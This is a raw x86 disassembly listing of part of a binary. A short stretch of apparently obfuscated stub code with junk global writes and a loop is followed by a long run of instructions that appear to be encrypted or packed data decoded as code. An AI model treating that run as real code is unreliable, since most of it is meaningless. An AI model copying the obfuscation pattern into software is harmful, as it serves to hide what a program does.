  4027d3:	xor    ecx,ebx
  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   ebp,DWORD PTR ds:0x7ac42569,0xa7a7a7a
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x6a],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1a42f8bf
  40298a:	inc    ebp
  40298b:	in     al,0x67
  40298d:	mov    ecx,ebp
  40298f:	ror    edx,1
  402991:	pop    ss
  402992:	or     bl,dh
  402994:	mov    al,0xed
  402996:	sub    edx,ebp
  402998:	mov    eax,ds:0xc1c4ce9a
  40299d:	dec    edx
  40299e:	aad    0x53
  4029a0:	ja     0x402a13
  4029a2:	imul   edx,DWORD PTR [ebp+0x52a9891f],0x36563bbb
  4029ac:	dec    ebx
  4029ad:	xor    ebp,DWORD PTR [ebp-0x7a]
  4029b0:	sbb    edx,DWORD PTR ds:0xd1778dbc
  4029b6:	imul   edx,DWORD PTR [ecx],0x8b4d47c
  4029bc:	(bad)  
  4029bd:	pop    DWORD PTR [edi+0x5f]
  4029c0:	jnp    0x4029db
  4029c2:	jb     0x402a1f
  4029c4:	retf   0xaa2e
  4029c7:	sbb    al,0x67
  4029c9:	mov    ebp,edx
  4029cb:	sbb    edi,DWORD PTR [edi]
  4029cd:	lahf   
  4029ce:	push   esi
  4029cf:	jo     0x402a32
  4029d1:	mov    esi,0x8b08fd8e
  4029d6:	adc    DWORD PTR [eax+0x291ae48b],esp
  4029dc:	idiv   ebx
  4029de:	xchg   BYTE PTR [ebp-0x51],dl
  4029e1:	cli    
  4029e2:	mov    dl,0xb5
  4029e4:	sbb    DWORD PTR [esi],ebp
  4029e6:	aas    
  4029e7:	leave  
  4029e8:	ror    BYTE PTR [edi],1
  4029ea:	add    eax,0x264e5db3
  4029ef:	into   
  4029f0:	in     al,0x37
  4029f2:	sub    al,0x8a
  4029f4:	jmp    0x402a63
  4029f6:	and    bh,BYTE PTR [edi+0x58]
  4029f9:	(bad)  
  4029fa:	loope  0x402990
  4029fc:	jbe    0x402a23
  4029fe:	xor    edx,DWORD PTR [ebx-0x48]
  402a01:	rcr    BYTE PTR [eax],0x24
  402a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a05:	xchg   ecx,eax
  402a06:	sbb    DWORD PTR [ecx],0x3ef0647b
  402a0c:	scas   eax,DWORD PTR es:[edi]
  402a0d:	pop    edx
  402a0e:	js     0x402a60
  402a10:	cwde   
  402a11:	mov    BYTE PTR [eax+0x7f],0x42
  402a15:	out    0x51,eax
  402a17:	neg    ch
  402a19:	into   
  402a1a:	(bad)  
  402a1b:	mov    edi,0x9ecc7986
  402a20:	jne    0x4029e6
  402a22:	sbb    esp,ebx
  402a24:	ficomp DWORD PTR ds:[ebx-0x77]
  402a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a29:	mov    al,0x24
  402a2b:	or     DWORD PTR es:[edi+0x69f3f330],ebp
  402a32:	in     eax,0x39
  402a34:	dec    edx
  402a35:	adc    ebx,eax
  402a37:	cmp    bh,BYTE PTR [esi+0x78]
  402a3a:	add    ebp,DWORD PTR [edx-0x2289cd1c]
  402a40:	jmp    0x5eb9:0xf8cca68a
  402a47:	bound  esi,QWORD PTR [eax]
  402a49:	iret   
  402a4a:	inc    ebp
  402a4b:	push   esp
  402a4c:	or     ch,BYTE PTR ds:0x463ce396
  402a52:	rcl    DWORD PTR [ecx+eiz*2-0x3d07041d],cl
  402a59:	lods   eax,DWORD PTR ds:[esi]
  402a5a:	jmp    0xf31adc3e
  402a5f:	push   ecx
  402a60:	and    eax,DWORD PTR [ebx]
  402a62:	sbb    eax,0x3e487eb1
  402a67:	cwde   
  402a68:	mov    bh,BYTE PTR [eax+edx*2]
  402a6b:	push   es
  402a6c:	inc    ecx
  402a6d:	not    ebp
  402a6f:	push   esp
  402a70:	into   
  402a71:	and    eax,0x8c4dadc4
  402a76:	scas   al,BYTE PTR es:[edi]
  402a77:	mov    ecx,0x6e8ff704
  402a7c:	and    al,0xff
  402a7e:	aad    0xd0
  402a80:	jmp    0x93436ba1
  402a85:	adc    al,0xea
  402a87:	inc    eax
  402a88:	cmp    ecx,DWORD PTR [ecx+0x6c356a63]
  402a8e:	pop    edi
  402a8f:	shr    al,0xaa
  402a92:	andps  xmm4,XMMWORD PTR fs:0xbd00bca2
  402a9a:	mov    BYTE PTR [eax+0x224822ef],ch
  402aa0:	sbb    al,0x25
  402aa2:	or     eax,0x558be261
  402aa7:	or     DWORD PTR [eax+0x6e960d63],0x9d6efd12
  402ab1:	ds gs jecxz 0x402a82
  402ab5:	mov    WORD PTR [edx-0xd],es
  402ab8:	jns    0x402ab2
  402aba:	inc    eax
  402abb:	pusha  
  402abc:	adc    al,0x1b
  402abe:	mov    eax,ds:0xff4cc1ec
  402ac3:	xchg   bh,bl
  402ac5:	xor    al,0xf1
  402ac7:	inc    esp
  402ac8:	pop    esp
  402ac9:	or     cl,BYTE PTR [edx+0x1fb64f94]
  402acf:	ror    al,0xa5
  402ad2:	(bad)  
  402ad6:	xlat   BYTE PTR gs:[ebx]
  402ad8:	xor    eax,0x2054dd03
  402add:	or     eax,0x5d65e9f5
  402ae2:	jnp    0x402b59
  402ae4:	mov    ds:0x204d2806,eax
  402ae9:	add    ah,al
  402aeb:	cmc    
  402aec:	ins    BYTE PTR es:[edi],dx
  402aed:	mov    bl,0x6
  402aef:	repz push esi
  402af1:	mov    edi,0x9b447fbe
  402af6:	mov    dh,0xdc
  402af8:	outs   dx,DWORD PTR ds:[esi]
  402af9:	repz in eax,0x2c
  402afc:	adc    al,0x92
  402afe:	xor    BYTE PTR [esi],ah
  402b00:	cmc    
  402b01:	mov    ds:0x6daa74c7,al
  402b06:	xor    eax,0x4bc1772d
  402b0b:	out    dx,eax
  402b0c:	inc    edx
  402b0d:	outs   dx,DWORD PTR ds:[esi]
  402b0e:	test   al,0x6d
  402b10:	stc    
  402b11:	jns    0x402b07
  402b13:	inc    eax
  402b14:	lea    ecx,[edx-0x40]
  402b17:	jno    0x402aca
  402b19:	jecxz  0x402ac9
  402b1b:	sub    BYTE PTR [edi-0x29],al
  402b1e:	inc    edx
  402b1f:	pop    ebp
  402b20:	popf   
  402b21:	mov    ds:0xd94f35f4,al
  402b26:	bound  edi,QWORD PTR [esi+0x744d8bd6]
  402b2c:	push   edi
  402b2d:	dec    ebp
  402b2e:	inc    esp
  402b2f:	jmp    0xdd0:0x40f43180
  402b36:	pop    esi
  402b37:	push   ebx
  402b38:	(bad)  
  402b39:	pushf  
  402b3a:	push   0x6f
  402b3c:	and    al,0xd3
  402b3e:	sbb    esi,DWORD PTR [edx-0x71]
  402b41:	ins    BYTE PTR es:[edi],dx
  402b42:	and    cl,BYTE PTR [edi]
  402b44:	and    BYTE PTR [ecx+0x4d92cc7b],bl
  402b4a:	int    0xa
  402b4c:	in     al,0xd1
  402b4e:	pop    eax
  402b4f:	xor    al,0xde
  402b51:	xchg   DWORD PTR [edi+0x3fc2739e],esi
  402b57:	idiv   DWORD PTR [ebx+edi*4]
  402b5a:	pop    esi
  402b5b:	xor    cl,BYTE PTR [ebp+0xb6774d9]
  402b61:	in     eax,0xc4
  402b63:	test   DWORD PTR [ebx+0x2800d42f],esi
  402b69:	sbb    eax,0xc80e1f1e
  402b6e:	jg     0x402be3
  402b70:	ja     0x402b7d
  402b72:	or     cl,0x4b
  402b75:	xor    al,BYTE PTR [ebx+esi*8-0x19]
  402b79:	add    dl,0xad
  402b7c:	inc    eax
  402b7d:	jns    0x402aff
  402b7f:	and    ebx,DWORD PTR [esi]
  402b81:	aad    0x84
  402b83:	jnp    0x402b58
  402b85:	xchg   ebx,ebx
  402b87:	imul   edi,esp,0xffffffa0
  402b8a:	mov    al,0xf2
  402b8c:	scas   al,BYTE PTR es:[edi]
  402b8d:	fsubr  DWORD PTR [ebp-0x3920c491]
  402b93:	xchg   ecx,eax
  402b94:	or     BYTE PTR [eax+edx*4+0x1772a673],cl
  402b9b:	cmp    BYTE PTR [esi],ch
  402b9d:	mov    dl,0x1b
  402b9f:	fnstenv [ebp-0x13e4b144]
  402ba5:	push   cs
  402ba6:	inc    edi
  402ba7:	jg     0x402ba5
  402ba9:	pop    edx
  402baa:	or     DWORD PTR [edi],esp
  402bac:	fnstcw WORD PTR [ecx-0x71]
  402baf:	(bad)  
  402bb0:	mov    WORD PTR [ecx+eiz*2+0x5],cs
  402bb4:	adc    eax,0xf0727909
  402bb9:	push   ecx
  402bba:	add    edx,edx
  402bbc:	adc    ah,BYTE PTR [ebp-0x2475142b]
  402bc2:	and    eax,0x969f5fa3
  402bc7:	in     al,0x84
  402bc9:	xchg   ecx,eax
  402bca:	inc    esp
  402bcb:	mov    ebx,0xbe60acc7
  402bd0:	ja     0x402b61
  402bd2:	or     al,0x15
  402bd4:	jns    0x402bc3
  402bd6:	js     0x402c45
  402bd8:	jmp    0x402c43
  402bda:	mov    ch,0x23
  402bdc:	fldcw  WORD PTR [ebx+0x73]
  402bdf:	adc    BYTE PTR [edx+edx*2-0x21af42b9],bl
  402be6:	aas    
  402be7:	icebp  
  402be8:	jg     0x402c59
  402bea:	dec    ecx
  402beb:	jl     0x402c04
  402bed:	sbb    al,0xd0
  402bef:	mov    BYTE PTR [ebp+0x7e],bl
  402bf2:	pushf  
  402bf3:	xlat   BYTE PTR ds:[ebx]
  402bf4:	inc    ecx
  402bf5:	(bad)  
  402bf7:	xor    al,0x50
  402bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bfa:	out    0xb6,eax
  402bfc:	addr16 out 0xf4,al
  402bff:	(bad)  
  402c00:	jp     0x402c41
  402c02:	ret    
  402c03:	mov    edi,0x81f14973
  402c08:	scas   al,BYTE PTR es:[edi]
  402c09:	jnp    0x402b9b
  402c0b:	adc    al,BYTE PTR [ebx-0x67]
  402c0e:	sub    dl,BYTE PTR [ebp-0x43ef3f19]
  402c14:	sub    eax,0x9ccbb40b
  402c19:	dec    esp
  402c1a:	xchg   ecx,eax
  402c1b:	and    al,0x84
  402c1d:	inc    edx
  402c1e:	adc    BYTE PTR [edi],ch
  402c20:	dec    ecx
  402c21:	ret    
  402c22:	mov    dl,0x1c
  402c24:	popf   
  402c25:	adc    DWORD PTR [edx],esi
  402c27:	shr    esi,cl
  402c29:	fwait
  402c2a:	mov    bl,0x3b
  402c2c:	push   ebx
  402c2d:	dec    DWORD PTR [edx]
  402c2f:	loopne 0x402bdb
  402c31:	out    0x58,eax
  402c33:	jmp    0xaead:0x75bb9b00
  402c3a:	int3   
  402c3b:	mov    ebp,0x61cc94b4
  402c40:	loope  0x402c05
  402c42:	jecxz  0x402c1a
  402c44:	(bad)
  402c47:	in     al,dx
  402c48:	sub    DWORD PTR [ecx],ebp
  402c4a:	int3   
  402c4b:	fsub   DWORD PTR ds:0xb1c1b340
  402c51:	popa   
  402c52:	mov    al,0x85
  402c54:	nop
  402c55:	and    dh,bh
  402c57:	(bad)  
  402c58:	fsub   st(7),st
  402c5a:	icebp  
  402c5b:	rcl    BYTE PTR [edx-0x66],cl
  402c5e:	pushf  
  402c5f:	lods   al,BYTE PTR ds:[esi]
  402c60:	sbb    al,0xce
  402c62:	sbb    BYTE PTR [esi+edx*1-0x76],dh
  402c66:	mov    DWORD PTR [ebx+0x2ce50f2c],edx
  402c6c:	int    0xfb
  402c6e:	int    0x8c
  402c70:	aam    0x0
  402c72:	add    cl,BYTE PTR [edi+0x68b14c99]
  402c78:	jg     0x402c57
  402c7a:	or     al,bh
  402c7c:	test   al,0x13
  402c7e:	mov    DWORD PTR [edx],ebx
  402c80:	xor    eax,0xcb442a31
  402c85:	xchg   ebp,eax
  402c86:	arpl   WORD PTR [eax+0x48],cx
  402c89:	push   ebp
  402c8a:	mov    esi,0x9e2007d1
  402c8f:	adc    edx,DWORD PTR [esi+ebp*8]
  402c92:	out    dx,eax
  402c93:	fdiv   DWORD PTR fs:[eax]
  402c96:	ja     0x402c95
  402c98:	popf   
  402c99:	push   esp
  402c9a:	push   es
  402c9b:	xrelease xchg DWORD PTR [ecx],esp
  402c9e:	sub    al,0x6c
  402ca0:	xor    eax,0x2439cc5c
  402ca5:	pop    es
  402ca6:	into   
  402ca7:	pusha  
  402ca8:	adc    al,BYTE PTR [ebx+esi*2]
  402cab:	jg     0x402d0a
  402cad:	push   ebx
  402cae:	rol    DWORD PTR [ebx+eiz*4],0x15
  402cb2:	mov    bh,0x32
  402cb4:	cmc    
  402cb5:	sti    
  402cb6:	sbb    ebp,DWORD PTR [ecx+ebp*4+0xa49734f]
  402cbd:	jbe    0x402ce2
  402cbf:	test   al,0x14
  402cc1:	imul   ebp,DWORD PTR [ecx+esi*1-0x78fd690a],0xffffffe8
  402cc9:	add    ebp,DWORD PTR [esi-0x10]
  402ccc:	pushf  
  402ccd:	mov    edi,0xe783e93d
  402cd2:	mov    al,ds:0x1e17e013
  402cd7:	or     ebp,DWORD PTR [edi+0x5e3c35c2]
  402cdd:	push   ss
  402cde:	push   esp
  402cdf:	and    eax,0xfa8e4f3
  402ce4:	xchg   ecx,eax
  402ce5:	scas   eax,DWORD PTR es:[edi]
  402ce6:	cwde   
  402ce7:	xchg   DWORD PTR [edx],ecx
  402ce9:	fwait
  402cea:	fwait
  402ceb:	push   esi
  402cec:	clc    
  402ced:	shl    eax,1
  402cef:	test   al,0x13
  402cf1:	mov    al,ds:0x241c2072
  402cf6:	in     eax,0xcb
  402cf8:	push   ds
  402cf9:	pushf  
  402cfa:	stos   DWORD PTR es:[edi],eax
  402cfb:	lods   eax,DWORD PTR ds:[esi]
  402cfc:	push   ebx
  402cfd:	xchg   edx,eax
  402cfe:	sti    
  402cff:	call   0xd5aabab3
  402d04:	cmp    DWORD PTR [ecx+0x21],ebx
  402d07:	in     al,dx
  402d08:	xchg   edx,eax
  402d09:	or     DWORD PTR [ebx],0x17
  402d0c:	cmc    
  402d0d:	test   BYTE PTR [esi+0x56],al
  402d10:	int    0xe0
  402d12:	push   0xbacee0c8
  402d17:	jbe    0x402cfd
  402d19:	mov    dh,BYTE PTR [ecx+0x63211b3d]
  402d1f:	imul   BYTE PTR [edi+eax*8]
  402d22:	out    0x86,al
  402d24:	sbb    ebx,ebp
  402d26:	inc    esp
  402d27:	call   0xe043995f
  402d2c:	ret    
  402d2d:	imul   DWORD PTR gs:0x95af7a0d
  402d34:	xor    DWORD PTR [ebx+0x6c],0x6ddfc945
  402d3b:	popf   
  402d3c:	imul   DWORD PTR [esi-0x74750fa0]
  402d42:	aad    0xf5
  402d44:	mov    cl,0xda
  402d46:	xor    al,0x71
  402d48:	mov    edx,edx
  402d4a:	push   ebp
  402d4b:	pop    eax
  402d4c:	fcomp  DWORD PTR [ebx-0xa]
  402d4f:	dec    ebp
  402d50:	cmp    ebp,DWORD PTR [esi]
  402d52:	enter  0x13ed,0xe0
  402d56:	test   BYTE PTR [ebp+ebp*8+0x19],ah
  402d5a:	ret    
  402d5b:	test   DWORD PTR [esi],eax
  402d5d:	mul    BYTE PTR [edx+edx*2-0x17]
  402d61:	add    ebp,0x4c
  402d64:	jne    0x402d2a
  402d66:	pop    ss
  402d67:	mov    esi,0xfef5b743
  402d6c:	mov    bh,0xda
  402d6e:	cmp    DWORD PTR [edx+ecx*1],ebx
  402d71:	mov    ebx,edi
  402d73:	xchg   eax,esp
  402d75:	sbb    BYTE PTR [edx+edx*4+0x684a8fa2],dl
  402d7c:	mov    ebp,0x7c4c0eb1
  402d81:	jae    0x402d2d
  402d83:	(bad)  
  402d85:	sbb    al,0xfa
  402d87:	add    BYTE PTR [edi+0x41],ch
  402d8a:	and    bh,dh
  402d8c:	xor    cl,BYTE PTR [eax+0x1ed901b0]
  402d92:	push   ss
  402d93:	enter  0x9d68,0x45
  402d97:	pop    esp
  402d98:	mov    al,BYTE PTR ds:0x61671abc
  402d9e:	div    DWORD PTR [ebp+0x16]
  402da1:	jl     0x402de6
  402da3:	clc    
  402da4:	lea    esp,[edi]
  402da6:	mov    al,ds:0xc5a6ff41
  402dab:	cmp    DWORD PTR [eax],esp
  402dad:	ins    BYTE PTR es:[edi],dx
  402dae:	xor    al,0x97
  402db0:	dec    esi
  402db1:	loopne 0x402e1b
  402db3:	and    edi,edx
  402db5:	ss cmp eax,0xb979ef33
  402dbb:	pop    esi
  402dbc:	fs jmp 0x402d51
  402dbf:	mov    WORD PTR [ebp+0x7b632c0],?
  402dc5:	(bad)  [ebp+0x2aeb958e]
  402dcb:	inc    ecx
  402dcc:	js     0x402d78
  402dce:	mov    DWORD PTR [ebx-0x13],edi
  402dd1:	inc    edx
  402dd2:	cs jbe 0x402d58
  402dd5:	and    eax,0x18b4e808
  402dda:	(bad)  
  402ddb:	in     eax,dx
  402ddc:	push   ebx
  402ddd:	xchg   BYTE PTR [ecx+eax*1-0x2d],bh
  402de1:	test   al,0xdf
  402de3:	(bad)  [ebx]
  402de5:	rcl    ecx,cl
  402de7:	cli    
  402de8:	cmp    BYTE PTR [ecx-0x2b],ch
  402deb:	fild   QWORD PTR ds:0xc62cec4
  402df1:	or     BYTE PTR gs:[edx-0x3],bl
  402df5:	inc    ecx
  402df6:	jae    0x402d7c
  402df8:	push   ebp
  402df9:	and    eax,0x1e1f3fc5
  402dfe:	xor    dh,BYTE PTR [edx+0x77a06bc4]
  402e04:	and    al,0xac
  402e06:	(bad)  
  402e08:	int3   
  402e09:	adc    dh,BYTE PTR [eax-0x43]
  402e0c:	mov    dl,0x8d
  402e0e:	and    cl,BYTE PTR [eax+0x627e6d46]
  402e14:	sub    ah,dl
  402e16:	arpl   WORD PTR [ecx+edi*4+0x69ed7b76],ax
  402e1d:	mov    esi,0x26cd690b
  402e22:	daa    
  402e23:	push   edx
  402e24:	addr16 daa 
  402e26:	stos   DWORD PTR es:[edi],eax
  402e27:	jbe    0x402e2c
  402e29:	cmp    bl,BYTE PTR [ebx-0x69]
  402e2c:	dec    esp
  402e2d:	pop    esp
  402e2e:	das    
  402e2f:	inc    edi
  402e30:	inc    eax
  402e31:	cmp    eax,0xc2a33fe5
  402e36:	loopne 0x402dd5
  402e38:	mov    ds,esi
  402e3a:	xchg   edx,eax
  402e3b:	push   es
  402e3c:	ja     0x402eb1
  402e3e:	pusha  
  402e3f:	xchg   esi,eax
  402e40:	leave  
  402e41:	sub    al,0x31
  402e43:	repz jmp 0xa349:0xf2c84333
  402e4b:	mov    ebx,0xcb7ea24a
  402e50:	fucomi st,st(0)
  402e52:	mov    DWORD PTR [edx],esp
  402e54:	cmp    DWORD PTR [edx],eax
  402e56:	scas   eax,DWORD PTR es:[edi]
  402e57:	jbe    0x402ddf
  402e59:	out    0x97,eax
  402e5b:	in     al,0x8d
  402e5d:	mov    eax,ds:0x7279325
  402e62:	iret   
  402e63:	aad    0xf
  402e65:	dec    ebx
  402e66:	in     al,dx
  402e67:	push   0x1c250a40
  402e6c:	dec    edi
  402e6d:	pop    esp
  402e6e:	popf   
  402e6f:	movsx  eax,WORD PTR [edx]
  402e72:	push   ss
  402e73:	adc    DWORD PTR [ecx+0x6b],esi
  402e76:	cwde   
  402e77:	push   ebp
  402e78:	cmp    esp,DWORD PTR [esi+ebp*1-0xf]
  402e7c:	jl     0x402ed7
  402e7e:	loope  0x402ec2
  402e80:	mov    esi,0xeb3b5869
  402e85:	cmp    al,0xbd
  402e87:	mov    DWORD PTR [esi+edi*4+0x796b02c4],esp
  402e8e:	retf   0xf9cc
  402e91:	je     0x402e39
  402e93:	in     eax,0x9a
  402e95:	daa    
  402e96:	in     al,dx
  402e97:	adc    BYTE PTR [eax],0x29
  402e9a:	cmp    edx,edx
  402e9c:	frstpm(287 only) 
  402e9e:	fwait
  402e9f:	cmp    eax,edi
  402ea1:	mov    ecx,0x8d8ceb60
  402ea6:	adc    ebx,DWORD PTR [ebp+0x4a]
  402ea9:	out    0xb8,al
  402eab:	out    dx,al
  402eac:	push   ebx
  402ead:	pushf  
  402eae:	ins    DWORD PTR es:[edi],dx
  402eaf:	jg     0x402f1e
  402eb1:	sbb    DWORD PTR [ecx],ecx
  402eb3:	sbb    cl,BYTE PTR [eax+0x1551f774]
  402eb9:	dec    esi
  402eba:	stos   BYTE PTR es:[edi],al
  402ebb:	pop    es
  402ebc:	arpl   WORD PTR [edi],cx
  402ebe:	(bad)  
  402ebf:	fbstp  TBYTE PTR [ebx+0x2fff177]
  402ec5:	pop    ecx
  402ec6:	inc    edi
  402ec7:	hlt    
  402ec8:	jle    0x402f05
  402eca:	jns    0x402e53
  402ecc:	int    0xb5
  402ece:	cmp    bh,BYTE PTR [ecx-0x7c]
  402ed1:	popf   
  402ed2:	inc    eax
  402ed3:	mov    dl,0x9c
  402ed5:	and    ch,BYTE PTR [edi+0x7d]
  402ed8:	scas   eax,DWORD PTR es:[edi]
  402ed9:	(bad)  
  402eda:	mov    eax,0xd00f74f4
  402edf:	test   dl,dh
  402ee1:	fwait
  402ee2:	(bad)
  402ee6:	sti    
  402ee7:	xchg   ebx,eax
  402ee8:	xchg   ecx,eax
  402ee9:	adc    edx,ecx
  402eeb:	push   esi
  402eec:	cld    
  402eed:	mov    esp,0xb99ac08d
  402ef2:	data16 setnp bl
  402ef6:	pop    edi
  402ef7:	cwde   
  402ef8:	sbb    DWORD PTR [ebp+edx*2+0x64317447],esp
  402eff:	js     0x402ed9
  402f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f02:	mov    ds:0xd99429b5,eax
  402f07:	dec    ebx
  402f08:	scas   al,BYTE PTR es:[edi]
  402f09:	mov    bh,0xd9
  402f0b:	jns    0x402f69
  402f0d:	add    cl,BYTE PTR [esi]
  402f0f:	js     0x402ea2
  402f11:	or     esi,DWORD PTR [esi]
  402f13:	std    
  402f14:	out    0x24,al
  402f16:	mov    cl,0x36
  402f18:	stc    
  402f19:	imul   edx,DWORD PTR [edx+0x558c1619],0xde100faf
  402f23:	loope  0x402ef8
  402f25:	stos   DWORD PTR es:[edi],eax
  402f26:	into   
  402f27:	imul   esp,DWORD PTR [ebx],0x5612bf42
  402f2d:	jne    0x402ec0
  402f2f:	adc    eax,0x938e7242
  402f34:	dec    ebx
  402f35:	shl    BYTE PTR [ebx],0x5a
  402f38:	aad    0x62
  402f3a:	jle    0x402f8b
  402f3c:	jmp    0xdef:0x8a1fe657
  402f43:	add    DWORD PTR [edi],0x1
  402f46:	(bad)  
  402f47:	(bad)
  402f4b:	mov    bl,0x8d
  402f4d:	xor    eax,0xf8f8afa0
  402f52:	rcl    BYTE PTR [edx-0x21],cl
  402f55:	pop    esi
  402f56:	push   ebx
  402f57:	mov    es,esi
  402f59:	out    0x7f,eax
  402f5b:	rcr    BYTE PTR [eax+0x79],cl
  402f5e:	fsub   st(6),st
  402f60:	or     eax,0x890c79d1
  402f65:	bound  ebx,QWORD PTR [edi+0x4b321ed7]
  402f6b:	cmp    al,0x93
  402f6d:	shl    DWORD PTR [ecx+0x62],1
  402f70:	int3   
  402f71:	jns    0x402f90
  402f73:	aam    0x6e
  402f75:	lock push esp
  402f77:	or     eax,0xd34797a1
  402f7c:	ret    0xc4b2
  402f7f:	test   eax,0x15ce3e7d
  402f84:	in     eax,dx
  402f85:	stos   DWORD PTR es:[edi],eax
  402f86:	cli    
  402f87:	pmulhw mm6,QWORD PTR [eax-0x587a2a14]
  402f8e:	or     eax,0xb77c7ac
  402f93:	inc    eax
  402f94:	jp     0x402f9e
  402f96:	jae    0x402ffc
  402f98:	outs   dx,DWORD PTR ds:[esi]
  402f99:	mov    cl,0xb1
  402f9b:	push   ecx
  402f9c:	sti    
  402f9d:	(bad)  
  402f9e:	xchg   BYTE PTR [eax+esi*8-0x7d],bh
  402fa2:	pop    edi
  402fa3:	in     al,dx
  402fa4:	dec    esp
  402fa5:	pop    edx
  402fa6:	mov    ds:0xcac6758a,eax
  402fab:	push   cs
  402fac:	sub    al,0x36
  402fae:	jbe    0x402f4a
  402fb0:	mov    al,0x55
  402fb2:	imul   BYTE PTR [ecx+0xa]
  402fb5:	test   DWORD PTR [edi],esp
  402fb7:	xor    DWORD PTR [ebp-0x40],ebp
  402fba:	outs   dx,BYTE PTR ds:[esi]
  402fbb:	in     eax,dx
  402fbc:	adc    eax,0xe4b55876
  402fc1:	xor    BYTE PTR [eax],cl
  402fc3:	inc    ebx
  402fc4:	mov    ch,0x15
  402fc6:	leave  
  402fc7:	iret   
  402fc8:	add    al,0xa6
  402fca:	imul   edx,ebp,0xffffffe7
  402fcd:	popa   
  402fce:	(bad)  
  402fcf:	pop    edx
  402fd0:	retf   0x8387
  402fd3:	cmp    edx,DWORD PTR [ebx]
  402fd5:	mov    cl,0x8c
  402fd7:	sub    al,ch
  402fd9:	loope  0x402fc5
  402fdb:	mov    ch,0x20
  402fdd:	jns    0x403048
  402fdf:	lock cmp DWORD PTR [ebp+0x35],esp
  402fe3:	imul   eax,edi,0xffffffa2
  402fe6:	sbb    DWORD PTR [edi-0x43],eax
  402fe9:	test   BYTE PTR [eax],ch
  402feb:	sub    DWORD PTR [edi+0x2e1d91ec],0x153620
